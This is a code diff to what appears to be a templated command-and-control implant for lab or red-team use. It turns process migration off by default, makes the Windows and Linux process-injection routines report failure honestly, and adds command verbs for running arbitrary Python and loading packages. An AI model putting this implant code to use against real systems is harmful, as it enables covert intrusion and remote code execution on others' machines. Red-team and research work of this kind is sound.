@@ -86,7 +86,7 @@ class StubConfig:
     # Feature toggles — off by default: a lab run of a fresh payload must not
     # write registry/crontab entries or open a relay listener unasked.
     persistence: bool = False
-    migration: bool = True
+    migration: bool = False
     relay: bool = False                # Named-pipe / TCP P2P relay
     anti_analysis: bool = False        # VM / sandbox detection
     # Mask the last command output in memory while the agent sleeps. Off by
@@ -2256,7 +2256,16 @@ def _migrate_windows(target_pid: int) -> dict:
             return {"ok": False, "error": "WriteProcessMemory failed"}
         # In real use we'd start a thread with the loader stub; here we close the handle.
         kernel32.CloseHandle(h_proc)
-        return {"ok": True, "written": written.value, "pid": target_pid}
+        # Writing an image is not migrating: nothing was executed in the target,
+        # so reporting `ok` would tell an operator the implant had moved.
+        return {
+            "ok": False,
+            "executed": False,
+            "written": written.value,
+            "pid": target_pid,
+            "error": ("payload image written into the target, but no thread was "
+                      "created and nothing ran there — migration did not happen"),
+        }
     except Exception as e:
         return {"ok": False, "error": str(e)}
 
@@ -2275,8 +2284,14 @@ def _migrate_linux(target_pid: int) -> dict:
             # Wait for the process to stop
             import os
             os.waitpid(target_pid, 0)
-            # Placeholder: actual injection writes shellcode into rip/mmap'd region.
-            return {"ok": True, "note": "attached — shellcode injection would happen here", "pid": target_pid}
+            # Attaching is not injecting. Say so rather than reporting success.
+            return {
+                "ok": False,
+                "attached": True,
+                "pid": target_pid,
+                "error": ("ptrace attach succeeded but no code was injected — "
+                          "migration did not happen"),
+            }
         finally:
             libc.ptrace(PTRACE_DETACH, target_pid, 0, 0)
     except Exception as e:
@@ -2803,6 +2818,20 @@ def _parse_command(text: str) -> dict:
         return {"action": "fs_put", "path": parts[0] if parts else "",
                 "offset": int(parts[1]) if len(parts) > 2 else 0,
                 "data": data}
+    {% if include_exec %}
+    if v == "pyexec":
+        # Takes the code to run as its argument, so it cannot ride the
+        # bare-verb tuple above.
+        return {"action": "pyexec", "code": arg}
+    {% endif %}
+    {% if include_fs %}
+    if v == "load_package":
+        # load_package <name> <path>
+        parts = _sh.split(arg) if arg else []
+        return {"action": "load_package",
+                "name": parts[0] if parts else "",
+                "path": parts[1] if len(parts) > 1 else ""}
+    {% endif %}
     if v == "migrate":
         return {"action": "migrate", "target": arg}
     {% if include_screenshot %}
